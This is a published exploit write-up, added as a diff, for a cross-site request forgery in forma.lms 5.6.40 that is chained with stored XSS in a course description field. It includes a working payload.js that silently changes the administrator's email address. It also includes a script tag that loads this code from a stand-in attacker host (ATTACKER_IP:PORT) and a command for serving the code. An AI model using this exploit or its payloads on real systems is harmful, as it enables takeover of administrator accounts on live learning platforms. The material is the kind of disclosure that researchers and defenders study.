@@ -1,0 +1,47 @@
+# Exploit Title: forma.lms 5.6.40 - Cross-Site Request Forgery (Change Admin Email) 
+# Date: 2020-05-21
+# Exploit Author: Daniel Ortiz
+# Vendor Homepage: https://sourceforge.net/projects/forma/
+# Tested on:  XAMPP for Linux 64bit 5.6.40-0
+
+
+## 1 - Description
+
+- Vulnerable form: Edit Profile
+- Details: The validation of the CSRF token depends on request method. Changing the request method from POST to GET the token validation is omitted by the backend.
+- Privileges: It requires admin privileges to change the admin email.
+- Location: Admin Area >user profile > Edit form
+- Endopoint: /formalms/appCore/index.php?r=lms/profile/show&ap=saveinfo
+
+
+## 2 -Triggering the Vulnerability
+
+To trigger this vulnerability the admin user must log in to the system.
+
+1) Setup a HTTP server on the attacker machine, e.g: python -m SimpleHTTPServer 9090
+2) In the attacker machine create a file with this content:
+
+[+] payload.js
+
+var target = document.location.host;
+var params = "r=lms/profile/show&ap=saveinfo&authentic_request=&up_lastname=&up_firstname=&up_email=hacked@admin.com&user_preference[ui.language]=0&up_signature=&save=Save+changes";
+
+function pwnEmail(){
+
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "http://" + target + "/formalms/appLms/index.php?"+params, true);
+    xhr.send(null);
+
+}
+
+pwnEmail();
+
+3) Edit a course and in the description field put this payload: 
+
+<script src="http://ATTACKER_IP:PORT/payload.js"/>
+
+The description field is vulnerable to XSS attacks and is used to trigger the csrf payload.
+
+4) Go to index page in formalms/appLms/index.php?r=lms/mycourses/show this trigger the XSS payload in the description field (the payload loads the payload.js file and execute the CSRF payload)
+
+5) The payload.js file is executed and the admin email is changed
